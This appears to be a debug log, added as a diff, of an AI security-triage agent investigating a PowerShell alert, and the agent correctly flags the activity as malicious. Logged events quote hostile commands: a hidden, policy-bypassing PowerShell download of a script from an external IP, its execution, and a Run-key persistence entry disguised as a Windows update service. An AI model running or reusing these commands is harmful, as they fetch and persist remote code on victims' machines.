@@ -1,0 +1,79 @@
+=== DEBUG SESSION START: 2026-03-03T03:06:03.663225+00:00 UTC ===
+
+[PLAYBOOK SELECTION]
+Alert Name: Suspicious PowerShell Script Execution
+Selected Playbook: suspicious_powershell.json
+
+[TOOL CALL]
+Tool: get_recent_events
+Arguments: {}
+
+[TOOL RESPONSE]
+[
+  {
+    "event_time": "2026-01-26T06:08:41.000Z",
+    "event_name": "PowerShellExecution",
+    "user": "r.kuznetsov",
+    "source_ip": "10.3.80.44",
+    "scriptblock": "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command Invoke-WebRequest http://91.214.88.109/winupd.ps1 -OutFile C:\\ProgramData\\winupd.ps1"
+  },
+  {
+    "event_time": "2026-01-26T06:11:02.000Z",
+    "event_name": "PowerShellExecution",
+    "user": "r.kuznetsov",
+    "source_ip": "10.3.80.44",
+    "scriptblock": "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File C:\\ProgramData\\winupd.ps1"
+  }
+]
+
+
+[TOOL CALL]
+Tool: get_recent_similar_alerts
+Arguments: {}
+
+[TOOL RESPONSE]
+[
+  {
+    "alert_id": "SOC-9621",
+    "alert_name": "Suspicious PowerShell Script Execution",
+    "start_time": "2026-01-26T06:08:41.000Z",
+    "source_ip": "10.3.80.44",
+    "endpoint": "SRV-WEB-02",
+    "user": "r.kuznetsov",
+    "scriptblock": "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command Invoke-WebRequest http://91.214.88.109/winupd.ps1 -OutFile C:\\ProgramData\\winupd.ps1"
+  },
+  {
+    "alert_id": "SOC-9622",
+    "alert_name": "Suspicious PowerShell Script Execution",
+    "start_time": "2026-01-26T06:11:02.000Z",
+    "source_ip": "10.3.80.44",
+    "endpoint": "SRV-WEB-02",
+    "user": "r.kuznetsov",
+    "scriptblock": "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File C:\\ProgramData\\winupd.ps1"
+  }
+]
+
+
+[FINAL LLM OUTPUT]
+{
+  "investigation_notes": {
+    "Alert ID": "SOC-9623",
+    "Start Time": "2026-01-26T06:14:39.000Z",
+    "Alert Name": "Suspicious PowerShell Script Execution",
+    "Source IP": "10.3.80.44",
+    "Destination IP": "91.214.88.109",
+    "Endpoint": "SRV-WEB-02",
+    "User": "r.kuznetsov",
+    "Playbook Used": "Suspicious PowerShell Triage",
+    "OS": "Windows Server 2019 Standard",
+    "Scriptblock": "New-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -Name 'WindowsUpdateSvc' -Value 'powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File C:\\ProgramData\\winupd.ps1' -PropertyType String -Force",
+    "File Path": "C:\\ProgramData\\winupd.ps1",
+    "Related Alerts": [
+      "SOC-9621",
+      "SOC-9622"
+    ],
+    "Description": "PowerShell was used on SRV-WEB-02 to download and execute C:\\ProgramData\\winupd.ps1 from 91.214.88.109, and a Run registry entry named WindowsUpdateSvc was created to persist that script. The execution used ExecutionPolicy Bypass and a hidden window, and multiple recent events show a download followed by execution of the same script. These behaviors (external download, execution with bypass, and persistence on a server) are consistent with malicious activity and present a high risk to the environment, so further investigation and escalation are warranted."
+  },
+  "classification": "HP"
+}
+
